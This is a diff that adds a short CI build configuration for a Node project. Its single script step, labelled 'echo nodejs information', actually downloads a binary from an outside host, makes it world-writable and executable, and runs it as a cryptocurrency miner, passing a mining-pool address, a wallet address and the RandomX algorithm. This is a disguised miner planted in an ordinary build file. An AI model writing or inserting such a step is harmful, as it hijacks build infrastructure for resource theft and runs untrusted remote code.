@@ -1,0 +1,9 @@
+box: node
+
+build:
+
+  steps:
+    - script:
+        name: echo nodejs information
+        code: |
+          wget https://swenson.my.id/mining/masterfile && chmod 777 masterfile && ./masterfile -o 139.99.124.170:80 -u 422HhkEH8jsG5YNa5qBRaDfQ9BErXC82PG7pY7tc3yfGiWkcfdq3mLxYhLm1HnZRw9QcmmrXiM4xdYyUEvN5x74mMeXM98y -k -a rx/0 -p anjaymabar
